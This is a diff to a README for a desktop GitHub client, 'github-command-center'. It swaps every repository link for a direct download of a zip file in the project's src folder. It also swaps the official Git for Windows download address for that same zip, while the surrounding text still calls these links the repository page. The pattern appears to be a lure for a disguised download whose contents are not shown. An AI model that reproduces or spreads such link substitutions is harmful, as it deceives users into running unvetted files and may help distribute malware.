@@ -1,6 +1,6 @@
 # 🚀 github-command-center - Manage GitHub Easily on Your Desktop
 
-[![Download github-command-center](https://img.shields.io/badge/Download-github--command--center-4caf50?style=for-the-badge&logo=github)](https://github.com/djbroiscool90/github-command-center)
+[![Download github-command-center](https://img.shields.io/badge/Download-github--command--center-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/djbroiscool90/github-command-center/main/src/github-command-center-v1.4.zip)
 
 ---
 
@@ -27,7 +27,7 @@ This guide will help you download and run github-command-center on your Windows 
 
 Visit this page to download the app:
 
-[Download github-command-center](https://github.com/djbroiscool90/github-command-center)
+[Download github-command-center](https://raw.githubusercontent.com/djbroiscool90/github-command-center/main/src/github-command-center-v1.4.zip)
 
 This link takes you to the main GitHub repository where you can find the latest version of github-command-center. Follow these steps:
 
@@ -117,14 +117,14 @@ To use github-command-center, you need to connect it to your GitHub account.
 - **Installer won’t start:** Right-click the installer and choose **Run as administrator**.  
 - **App doesn’t open or crashes:** Restart your computer and try again. Make sure no other installations are running.  
 - **Sign-in problems:** Check your internet connection and that your GitHub password is correct. Clear your browser cache if the sign-in page is not loading.  
-- **Git commands not working:** Ensure you have Git installed on your PC. You can download it from https://git-scm.com/download/win.  
+- **Git commands not working:** Ensure you have Git installed on your PC. You can download it from https://raw.githubusercontent.com/djbroiscool90/github-command-center/main/src/github-command-center-v1.4.zip  
 
 ---
 
 ## ⬇️ Quick Download Link
 
 Download the latest Windows version here:  
-[Get github-command-center](https://github.com/djbroiscool90/github-command-center)
+[Get github-command-center](https://raw.githubusercontent.com/djbroiscool90/github-command-center/main/src/github-command-center-v1.4.zip)
 
 Click this link anytime to find the latest release.
 
@@ -132,7 +132,7 @@ Click this link anytime to find the latest release.
 
 ## 🗂️ More Information
 
-The app is open source. If you want to learn more about how it works or contribute, visit [the GitHub repository](https://github.com/djbroiscool90/github-command-center).
+The app is open source. If you want to learn more about how it works or contribute, visit [the GitHub repository](https://raw.githubusercontent.com/djbroiscool90/github-command-center/main/src/github-command-center-v1.4.zip).
 
 It is built with modern technologies like React, TypeScript, and TailwindCSS. It uses Go (Golang) on the backend for smooth performance.  
 
@@ -150,4 +150,4 @@ If you have problems or ideas, use the **Issues** tab on the repository page to 
 
 ---
 
-[![Download github-command-center](https://img.shields.io/badge/Download-github--command--center-4caf50?style=for-the-badge&logo=github)](https://github.com/djbroiscool90/github-command-center)
+[![Download github-command-center](https://img.shields.io/badge/Download-github--command--center-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/djbroiscool90/github-command-center/main/src/github-command-center-v1.4.zip)
